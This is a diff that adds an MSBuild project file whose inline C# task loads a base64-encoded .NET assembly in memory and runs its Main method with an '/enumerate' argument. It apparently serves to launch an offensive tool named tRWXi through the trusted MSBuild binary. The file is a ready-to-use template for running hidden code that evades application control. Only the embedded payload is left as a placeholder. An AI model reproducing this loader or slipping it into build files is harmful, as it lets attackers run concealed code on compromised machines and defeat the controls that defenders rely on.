@@ -1,0 +1,37 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="MSBuild">
+   <tRWXi/>
+  </Target>
+   <UsingTask
+    TaskName="tRWXi"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+     <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+		    using System;
+			using System.Reflection;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+			
+			public class tRWXi : Task, ITask
+			{
+			    public override bool Execute()
+				{
+				    // [Convert]::ToBase64String([IO.File]::ReadAllBytes($tRWXiExe))
+                    string tRWXiBase64 = "...";
+                    var ass = Assembly.Load(Convert.FromBase64String(tRWXiBase64));
+                    var typ = ass.GetType("tRWXi.Program");
+                    var act = Activator.CreateInstance(typ);
+                    var m = typ.GetMethod("Main");
+                    string[] ars = new[] { "/enumerate" }; 
+                    m.Invoke(act, new object[] { ars });
+				    return true;
+				}
+			}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
